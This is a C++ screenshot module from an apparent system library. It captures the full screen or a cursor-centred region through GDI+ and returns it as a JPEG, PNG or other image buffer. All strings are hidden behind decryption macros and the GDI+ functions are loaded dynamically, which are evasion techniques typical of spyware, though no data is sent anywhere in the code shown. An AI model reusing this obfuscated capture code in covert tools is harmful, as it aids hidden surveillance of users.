#include "sys_includes.h"
#include <objbase.h>
#include <gdiplus.h>

#include "screenshot.h"

#include "syslib\mem.h"
#include "syslib\scrnshot.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

static const GUID EncoderQuality={0x1d5be4b5,0xfa4a,0x452d,0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb};
static const GUID EncoderColorDepth={0x66087055,0xad66,0x4c7c,0x9a,0x18,0x38,0xa2,0x31,0x0b,0x83,0x37};

static LPCWSTR GetMimeType(SCREENSHOT_COMPRESSOR_TYPE dwCompressor)
{
    LPCWSTR lpMime;
    switch (dwCompressor)
    {
        case JPEG:
        {
            lpMime=dcrW_3ec383cf("image/jpeg");
            break;
        }
        case PNG:
        {
            lpMime=dcrW_352a82c2("image/png");
            break;
        }
        case GIF:
        {
            lpMime=dcrW_584bdf8d("image/gif");
            break;
        }
        case TIFF:
        {
            lpMime=dcrW_55d103dd("image/tiff");
            break;
        }
        default:
        {
            lpMime=dcrW_59eec251("image/bmp");
            break;
        }
    }
    return lpMime;
}

static void DrawCursor(HDC hDC,int dwX,int dwY)
{
    do
    {
        HICON hCur=(HICON)LoadImage(NULL,MAKEINTRESOURCE(OCR_NORMAL),IMAGE_CURSOR,0,0,LR_DEFAULTSIZE|LR_SHARED);
        if (!hCur)
            break;

        ICONINFO CurInfo;
        if (!GetIconInfo(hCur,&CurInfo))
            break;

        POINT ptCursor;
        if (!GetCursorPos(&ptCursor))
            break;

        int dwX1=0;
        if ((dwX1=ptCursor.x-CurInfo.xHotspot-dwX) < 0)
            dwX1=0;

        int dwY1=0;
        if ((dwY1=ptCursor.y-CurInfo.yHotspot-dwY) < 0)
            dwY1=0;

        DrawIcon(hDC,dwX1,dwY1,hCur);
    }
    while (false);

    return;
}

static IStream *MakeScreen(SCREENSHOT_COMPRESSOR_TYPE dwCompressor,DWORD dwQuality,WORD wRectSize,bool bDrawCursor)
{
    IStream *isStream=NULL;
    HMODULE hGdiPlus=NULL;
    Gdiplus::GdiplusStartupInput StartupInput;
    do
    {
        hGdiPlus=LoadLibrary(dcr_807b8775("gdiplus.dll"));
        if (!hGdiPlus)
            break;

        GDIPLUSSTARTUP gpStartup=(GDIPLUSSTARTUP)GetProcAddress(hGdiPlus,dcrA_8f6ce5a5("GdiplusStartup"));
        if (!gpStartup)
            break;

        GDIPLUSSHUTDOWN gpShutdown=(GDIPLUSSHUTDOWN)GetProcAddress(hGdiPlus,dcrA_bb59a21c("GdiplusShutdown"));
        if (!gpShutdown)
            break;

        GDIPCREATEBITMAPFROMHBITMAP gpCreateBitmapFromHBitmap=(GDIPCREATEBITMAPFROMHBITMAP)GetProcAddress(hGdiPlus,dcrA_ba213295("GdipCreateBitmapFromHBITMAP"));
        if (!gpCreateBitmapFromHBitmap)
            break;

        GDIPDISPOSEIMAGE gpDisposeImage=(GDIPDISPOSEIMAGE)GetProcAddress(hGdiPlus,dcrA_63069def("GdipDisposeImage"));
        if (!gpDisposeImage)
            break;

        GDIPGETIMAGEENCODERSSIZE gpGetImageEncodersSize=(GDIPGETIMAGEENCODERSSIZE)GetProcAddress(hGdiPlus,dcrA_c4100635("GdipGetImageEncodersSize"));
        if (!gpGetImageEncodersSize)
            break;

        GDIPGETIMAGEENCODERS gpGetImageEncoders=(GDIPGETIMAGEENCODERS)GetProcAddress(hGdiPlus,dcrA_b325889f("GdipGetImageEncoders"));
        if (!gpGetImageEncoders)
            break;

        GDIPSAVEIMAGETOSTREAM gpSaveImageToStream=(GDIPSAVEIMAGETOSTREAM)GetProcAddress(hGdiPlus,dcrA_6bc99c63("GdipSaveImageToStream"));
        if (!gpSaveImageToStream)
            break;

        StartupInput.GdiplusVersion=1;
        StartupInput.DebugEventCallback=NULL;
        StartupInput.SuppressBackgroundThread=FALSE;
        StartupInput.SuppressExternalCodecs=FALSE;
        ULONG_PTR dwToken;
        if (gpStartup(&dwToken,&StartupInput,NULL) != Gdiplus::Ok)
            break;

        HDC hDC=CreateDC(dcr_ce9a9d72("DISPLAY"),NULL,NULL,NULL),
            hCompDC=CreateCompatibleDC(hDC);

        DWORD dwWidth,dwHeight;
        if (wRectSize)
        {
            dwWidth=wRectSize;
            dwHeight=wRectSize;
        }
        else
        {
            dwWidth=GetDeviceCaps(hDC,HORZRES);
            dwHeight=GetDeviceCaps(hDC,VERTRES);
        }

        HBITMAP hBitmap=CreateCompatibleBitmap(hDC,dwWidth,dwHeight);
        SelectObject(hCompDC,hBitmap);

        int dwX=0,dwY=0;
        if (wRectSize)
        {
            POINT ptCursor;
            GetCursorPos(&ptCursor);

            if ((dwX=ptCursor.x-wRectSize/2) < 0)
                dwX=0;

            if ((dwY=ptCursor.y-wRectSize/2) < 0)
                dwY=0;

            if ((ptCursor.x-=dwX) < 0)
                ptCursor.x=0;

            if ((ptCursor.y-=dwY) < 0)
                ptCursor.y=0;
        }

        BitBlt(hCompDC,0,0,dwWidth,dwHeight,hDC,dwX,dwY,SRCCOPY|CAPTUREBLT);

        if (bDrawCursor)
            DrawCursor(hCompDC,dwX,dwY);

        Gdiplus::GpBitmap *gpBitmap=NULL;
        if ((gpCreateBitmapFromHBitmap(hBitmap,NULL,&gpBitmap) == Gdiplus::Ok) && (gpBitmap))
        {
            UINT dwCountOfEncoders=0,
                 dwSizeOfEncoders=0;

            Gdiplus::ImageCodecInfo *ImageCodecInfo;
            if ((gpGetImageEncodersSize(&dwCountOfEncoders,&dwSizeOfEncoders) == Gdiplus::Ok) && (dwSizeOfEncoders) && (dwCountOfEncoders) && (ImageCodecInfo=(Gdiplus::ImageCodecInfo*)MemAlloc(dwSizeOfEncoders)))
            {
                CLSID EncoderClsid;
                if (gpGetImageEncoders(dwCountOfEncoders,dwSizeOfEncoders,ImageCodecInfo) == Gdiplus::Ok)
                {
                    LPCWSTR lpMime=GetMimeType(dwCompressor);
                    for (UINT i=0; i < dwCountOfEncoders; i++)
                    {
                        if (!lstrcmpiW(lpMime,ImageCodecInfo[i].MimeType))
                        {
                            memcpy(&EncoderClsid,&ImageCodecInfo[i].Clsid,sizeof(CLSID));
                            dwCountOfEncoders=0;
                            break;
                        }
                    }
                }
                MemFree(ImageCodecInfo);

                if ((!dwCountOfEncoders) && (CreateStreamOnHGlobal(NULL,TRUE,&isStream) == S_OK) && (isStream))
                {
                    Gdiplus::EncoderParameters Params;
                    Params.Count=0;
                    if (dwQuality > 0)
                    {
                        memcpy(&Params.Parameter[Params.Count].Guid,&EncoderQuality,sizeof(EncoderQuality));
                        Params.Parameter[Params.Count].Type=Gdiplus::EncoderParameterValueTypeLong;
                        Params.Parameter[Params.Count].NumberOfValues=1;
                        Params.Parameter[Params.Count].Value=&dwQuality;
                        Params.Count++;
                    }

                    if (gpSaveImageToStream(gpBitmap,isStream,&EncoderClsid,&Params) != Gdiplus::Ok)
                    {
                        isStream->Release();
                        isStream=NULL;
                    }
                    else
                    {
                        LARGE_INTEGER li={0};
                        isStream->Seek(li,STREAM_SEEK_SET,NULL);
                    }
                }
            }
            gpDisposeImage(gpBitmap);
        }

        DeleteDC(hCompDC);
        DeleteDC(hDC);
        DeleteObject(hBitmap);

        gpShutdown(dwToken);
    }
    while (false);

    if (hGdiPlus)
        FreeLibrary(hGdiPlus);

    return isStream;
}

SYSLIBFUNC(BOOL) TakeScreenShot(SCREENSHOT_COMPRESSOR_TYPE dwCompressor,DWORD dwQuality,WORD wRectSize,BOOL bDrawCursor,LPBYTE *lppBuf,LPDWORD lpdwBufSize)
{
    if ((!SYSLIB_SAFE::CheckParamWrite(lppBuf,sizeof(*lppBuf))) || (!SYSLIB_SAFE::CheckParamWrite(lpdwBufSize,sizeof(*lpdwBufSize))))
        return false;

    BOOL bRet=false;
    IStream *Stream=MakeScreen(dwCompressor,dwQuality,wRectSize,bDrawCursor);
    if (Stream)
    {
        STATSTG ss;
        if ((Stream->Stat(&ss,STATFLAG_NONAME) == S_OK) && (!ss.cbSize.HighPart))
        {
            LPBYTE lpBuf=(LPBYTE)MemQuickAlloc(ss.cbSize.LowPart);
            if (lpBuf)
            {
                if (Stream->Read(lpBuf,ss.cbSize.LowPart,&ss.cbSize.LowPart) == S_OK)
                {
                    *lpdwBufSize=ss.cbSize.LowPart;
                    *lppBuf=lpBuf;
                    bRet=true;
                }
                else
                    MemFree(lpBuf);
            }
        }
        Stream->Release();
    }
    return bRet;
}

